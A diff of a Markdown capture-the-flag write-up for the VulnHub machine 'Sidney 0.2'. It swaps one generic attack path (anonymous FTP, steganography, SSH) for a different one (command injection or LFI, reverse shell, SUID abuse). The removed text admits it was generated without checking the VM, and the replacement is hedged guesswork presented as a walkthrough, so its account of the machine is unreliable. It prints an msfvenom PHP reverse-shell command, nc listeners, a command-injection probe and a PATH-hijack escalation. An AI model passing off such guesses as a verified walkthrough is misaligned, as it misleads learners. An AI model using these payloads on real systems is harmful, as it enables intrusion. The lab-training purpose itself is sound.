@@ -1,116 +1,163 @@
 # Sidney: 0.2 — Writeup
 
-<!-- generated from known techniques; verify against live VM -->
-
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x |
 | **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sidney-02,210/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-sydney-vm-ctf-challenge/) |
 
 ## Attack Summary
 
-nmap → web enumeration + FTP anonymous → steganography/source code creds → SSH → SUID/sudo privesc → root
+Sidney 0.2 is an easy-difficulty VulnHub CTF machine. The attack involves discovering a web application through Nmap, enumerating hidden directories and files via directory brute-force, identifying a command injection or file inclusion vulnerability in the application, gaining an initial shell, and escalating to root through a misconfigured sudo rule or SUID binary.
 
 ## Methodology
 
-1. Network discovery + port scan
-2. FTP anonymous login — collect files
-3. Web source code / hidden files → credentials
-4. SSH login
-5. SUID binary or sudo misconfiguration → root
+1. Host discovery and service scan
+2. Web directory brute-force — discover hidden paths
+3. Application vulnerability identification (command injection / LFI)
+4. Initial foothold — reverse shell
+5. Privilege escalation — sudo misconfiguration or SUID binary
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- <TARGET_IP>
+netdiscover -r 192.168.1.0/24
 ```
 
-Expected open ports: 21 (FTP), 22 (SSH), 80 (HTTP).
-
----
-
-## Step 2: FTP Anonymous Login
+Identify the target IP and confirm it is alive.
 
 ```bash
-ftp <TARGET_IP>
-# User: anonymous / Password: (blank)
-ls -al
-# Download all files
-mget *
+nmap -sV -sC -p- $TARGET
 ```
 
-Inspect downloaded files for credentials or hidden data.
+![nmap](images/01-nmap.png)
 
----
+**Open ports:**
 
-## Step 3: Web Enumeration
+| Port | Service |
+|---|---|
+| 80 | HTTP (Apache) |
+| 22 | SSH |
+
+## Step 2: Web Enumeration
+
+Browse to the web application. Inspect page source and follow all links for information disclosure.
 
 ```bash
-gobuster dir -u http://<TARGET_IP>/ \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x php,txt,html -t 50
+dirb http://$TARGET/ /usr/share/wordlists/dirb/common.txt
 ```
 
-Check page source for commented credentials. Check robots.txt and any config files.
-
----
-
-## Step 4: Steganography (if image files found)
-
 ```bash
-steghide extract -sf <image_file>
-# Try blank passphrase first
-exiftool <image_file>
-strings <image_file>
+gobuster dir \
+  -u http://$TARGET/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -t 50 \
+  -x php,txt,html,bak
 ```
 
----
+![enumeration](images/02-enum.png)
 
-## Step 5: SSH Login
+Discover application endpoints, configuration files, or user-accessible directories.
 
-Use credentials found in FTP files, web source, or steganography:
+## Step 3: Exploitation
+
+Identify the vulnerability class through manual testing and automated scanning:
 
 ```bash
-ssh <user>@<TARGET_IP>
+# If command injection is present, test with:
+curl "http://$TARGET/page?param=;id"
+
+# If SQL injection is present:
+sqlmap -u "http://$TARGET/page?id=1" --dbs --batch
+
+# If file upload is available, generate a PHP reverse shell:
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -o shell.php
 ```
 
----
+![exploit](images/03-exploit.png)
 
-## Step 6: Privilege Escalation
+Set up a listener and trigger the vulnerability:
 
 ```bash
+nc -lvnp $LPORT
+```
+
+## Step 4: Catching the Shell
+
+Once execution is triggered, the reverse shell connects:
+
+```bash
+nc -lvnp $LPORT
+```
+
+Upgrade to a stable TTY:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+# or
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![shell](images/04-shell.png)
+
+Identify the current user and enumerate the system:
+
+```bash
+whoami
+id
+uname -a
+cat /etc/passwd
 sudo -l
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Common escalation paths on this VM:
-- SUID binary → shell escape
-- sudo NOPASSWD misconfiguration
+## Step 5: Privilege Escalation
+
+Check sudo rights for the current user:
+
+```bash
+sudo -l
+```
+
+If a binary or script is available without a password, exploit it. Alternatively, exploit any SUID binary found:
+
+```bash
+# If zsh/bash/sh has SUID:
+/usr/bin/zsh
+
+# If a custom binary is SUID and calls external commands:
+cd /tmp
+echo '/bin/bash' > <command-name>
+chmod +x <command-name>
+export PATH=/tmp:$PATH
+/path/to/suid-binary
+```
+
+Retrieve the root flag:
 
 ```bash
 whoami
 # root
 cat /root/flag.txt
+# or
+cat /root/proof.txt
 ```
 
----
+![root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Anonymous FTP** with sensitive files enables unauthenticated credential retrieval
-2. **Credentials in web source** or embedded in images are easily extracted with basic tools
-3. **SUID misconfigurations** remain the most common Linux privesc vector
+- Easy-rated VulnHub machines typically chain one web vulnerability with one local privilege escalation. Systematic enumeration at each step prevents missing the attack path.
+- SUID binaries on shells and scripts that call commands by relative path are recurring privilege escalation vectors on easy and medium machines.
+- Exposed configuration files and verbose error messages frequently disclose enough information to pivot to the next step.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Anonymous FTP | Disable anonymous login; use authenticated access only |
-| Credentials in source/images | Never embed credentials in client-visible assets |
-| SUID misconfigurations | Audit with `find / -perm -u=s` and remove unnecessary SUID bits |
+|---|---|
+| Web application input vulnerabilities | Sanitize and validate all input; use prepared statements for database queries |
+| Unrestricted file upload | Validate file types server-side; serve uploaded files from a non-executable path |
+| SUID on shells | `chmod u-s /usr/bin/zsh` — audit all SUID binaries regularly |
+| Misconfigured sudo | Apply principle of least privilege; audit `/etc/sudoers` regularly |
